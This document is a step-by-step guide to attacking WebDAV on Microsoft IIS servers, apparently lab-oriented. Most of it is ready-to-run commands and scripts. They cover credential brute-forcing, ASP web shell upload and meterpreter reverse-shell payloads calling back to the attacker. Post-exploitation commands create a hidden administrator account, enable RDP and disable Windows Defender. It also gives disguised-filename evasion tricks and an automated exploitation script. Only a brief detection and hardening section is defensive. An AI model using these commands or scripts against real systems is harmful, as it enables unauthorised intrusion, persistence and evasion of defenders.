# Exploiting WebDAV on Microsoft IIS

## Overview

This guide covers the complete exploitation process for WebDAV services running on Microsoft IIS, including enumeration, authentication bypass/brute-forcing, and achieving remote code execution through web shell deployment.

## Prerequisites

### Tools Required

- **Kali Linux** or similar penetration testing distribution
- **Nmap** for service enumeration
- **Hydra** for brute-force attacks
- **davtest** for WebDAV configuration analysis
- **cadaver** for WebDAV interaction
- **Metasploit Framework** for payload generation

## Initial Reconnaissance

### Service Discovery

```bash
# Comprehensive service scan
nmap -sS -sV -p- <target_ip>

# Focused web service scan
nmap -sS -sV -p 80,443,8080 <target_ip>

# WebDAV-specific enumeration
nmap -p 80 --script http-enum <target_ip>
nmap -p 80 --script http-webdav-scan <target_ip>
```

### WebDAV Directory Detection

```bash
# Check for WebDAV directory
curl -I http://<target_ip>/webdav/

# Test WebDAV methods
curl -X OPTIONS http://<target_ip>/ -I

# Expected output for WebDAV enabled:
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="WebDAV"
# Public: OPTIONS, TRACE, GET, HEAD, POST, PUT, DELETE, COPY, MOVE, PROPFIND
```

## Authentication Bypass and Brute-Forcing

### Manual Authentication Testing

```bash
# Test default credentials
curl -u admin:admin http://<target_ip>/webdav/
curl -u administrator:password http://<target_ip>/webdav/
curl -u guest:guest http://<target_ip>/webdav/
```

### Automated Brute-Force with Hydra

```bash
# Basic Hydra syntax for WebDAV
hydra -L <user_list> -P <password_list> <target_ip> http-get /webdav/

# Example with common wordlists
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
      -P /usr/share/wordlists/metasploit/common_passwords.txt \
      <target_ip> http-get /webdav/

# More comprehensive attack
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/seclists/Passwords/rockyou.txt \
      <target_ip> http-get /webdav/ -t 10 -w 30
```

### Custom Brute-Force Script

```bash
#!/bin/bash
# webdav_brute.sh
TARGET=$1
USER_LIST="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
PASS_LIST="/usr/share/wordlists/seclists/Passwords/rockyou.txt"

echo "[*] Starting WebDAV brute force on $TARGET"

while IFS= read -r user; do
    while IFS= read -r pass; do
        response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "http://$TARGET/webdav/")
        if [ "$response" -eq 200 ]; then
            echo "[+] Valid credentials found: $user:$pass"
            echo "$user:$pass" > webdav_credentials.txt
            exit 0
        fi
    done < "$PASS_LIST"
done < "$USER_LIST"

echo "[-] No valid credentials found"
```

## WebDAV Configuration Analysis

### Using davtest for Vulnerability Assessment

```bash
# Basic davtest scan
davtest -url http://<target_ip>/webdav/

# With authentication
davtest -url http://<target_ip>/webdav/ -auth <username>:<password>

# Comprehensive testing
davtest -url http://<target_ip>/webdav/ -auth <username>:<password> \
        -cleanup -create -directory davtest_scan
```

### Manual WebDAV Method Testing

```bash
# Test PUT method
curl -X PUT -u <username>:<password> \
     http://<target_ip>/webdav/test.txt \
     -d "test content"

# Test DELETE method
curl -X DELETE -u <username>:<password> \
     http://<target_ip>/webdav/test.txt

# Test PROPFIND for directory listing
curl -X PROPFIND -u <username>:<password> \
     http://<target_ip>/webdav/
```

## Web Shell Deployment

### Available Web Shells in Kali

```bash
# List available web shells
ls -la /usr/share/webshells/

# ASP web shells
ls /usr/share/webshells/asp/
# Common options: cmdasp.asp, webshell.asp
```

### Manual Web Shell Upload with cadaver

```bash
# Connect to WebDAV with cadaver
cadaver http://<target_ip>/webdav/

# Authentication prompt will appear
# Username: <username>
# Password: <password>

# Once authenticated:
ls                          # List directory contents
put /usr/share/webshells/asp/cmdasp.asp  # Upload web shell
ls                          # Verify upload
quit                       # Exit cadaver
```

### Alternative Upload Methods

```bash
# Using curl for upload
curl -X PUT -u <username>:<password> \
     http://<target_ip>/webdav/shell.asp \
     --data-binary @/usr/share/webshells/asp/cmdasp.asp

# Using browser access (if available)
# Navigate to: http://<target_ip>/webdav/
# Upload file through web interface
```

## Command Execution and Post-Exploitation

### Web Shell Usage

Once the web shell is uploaded, access it through:

```
http://<target_ip>/webdav/cmdasp.asp
```

### Common Commands via Web Shell

```cmd
# System information
whoami
systeminfo
hostname

# Network information
ipconfig /all
netstat -an

# User enumeration
net user
net localgroup administrators

# File system exploration
dir C:\
type C:\flag.txt

# Network shares
net share
```

### Advanced Post-Exploitation

```cmd
# Create new user
net user hacker Password123! /add
net localgroup administrators hacker /add

# Enable RDP (if available)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Windows Defender (temporarily)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

## Metasploit Integration

### Generating ASP Payload

```bash
# Generate ASP meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f asp > shell.asp

# Alternative payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<your_ip> LPORT=4444 -f asp > shell.asp
```

### Upload and Execute Metasploit Payload

```bash
# Upload via cadaver
cadaver http://<target_ip>/webdav/
put shell.asp
quit

# Start Metasploit handler
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit
"

# Trigger the payload by accessing:
# http://<target_ip>/webdav/shell.asp
```

## Defense Evasion Techniques

### Obfuscation Methods

```bash
# Rename to less suspicious name
mv shell.asp document_update.asp

# Use alternative extensions
cp shell.asp shell.asa
cp shell.asp shell.cer

# Encode payload
base64 -w0 shell.asp > shell.b64
```

### Cleanup Procedures

```bash
# Remove uploaded files via cadaver
cadaver http://<target_ip>/webdav/
delete shell.asp
delete document_update.asp
quit

# Remove via curl
curl -X DELETE -u <username>:<password> http://<target_ip>/webdav/shell.asp
```

## Detection and Prevention

### Indicators of Compromise

- Unusual ASP file uploads to WebDAV directories
- Unexpected PROPFIND or PUT requests in logs
- Web shell signatures in web server access logs
- New user accounts created via web interfaces

### Hardening Recommendations

```powershell
# Disable WebDAV if not required
Uninstall-WindowsFeature Web-DAV-Publishing

# Restrict WebDAV to specific directories
# Implement strong authentication requirements
# Regular audit of WebDAV directory contents
# Implement file upload filtering
```

## Automated Exploitation Script

```bash
#!/bin/bash
# webdav_exploit.sh
TARGET=$1
USER=$2
PASS=$3

echo "[*] Starting WebDAV exploitation against $TARGET"

# Generate payload
echo "[*] Generating meterpreter payload"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=4444 -f asp > /tmp/shell.asp

# Upload payload
echo "[*] Uploading payload to WebDAV"
curl -X PUT -u "$USER:$PASS" "http://$TARGET/webdav/document_update.asp" --data-binary @/tmp/shell.asp

# Verify upload
echo "[*] Verifying upload"
response=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASS" "http://$TARGET/webdav/document_update.asp")
if [ "$response" -eq 200 ]; then
    echo "[+] Payload uploaded successfully"
else
    echo "[-] Upload failed"
    exit 1
fi

echo "[*] Setup complete. Start Metasploit handler and trigger:"
echo "[*] http://$TARGET/webdav/document_update.asp"

# Cleanup
rm /tmp/shell.asp
```

## Key Takeaways

1. **Thorough Enumeration**: Always start with comprehensive service discovery
2. **Credential Attacks**: WebDAV often uses weak/default credentials
3. **File Upload Testing**: Verify which file extensions can be executed
4. **Web Shell Selection**: Choose appropriate web shells for the target environment
5. **Post-Exploitation**: Leverage access for further network enumeration
6. **Cleanup**: Always remove uploaded files to maintain operational security

This methodology provides a complete attack chain for exploiting WebDAV on Microsoft IIS systems, from initial reconnaissance to maintaining persistent access.
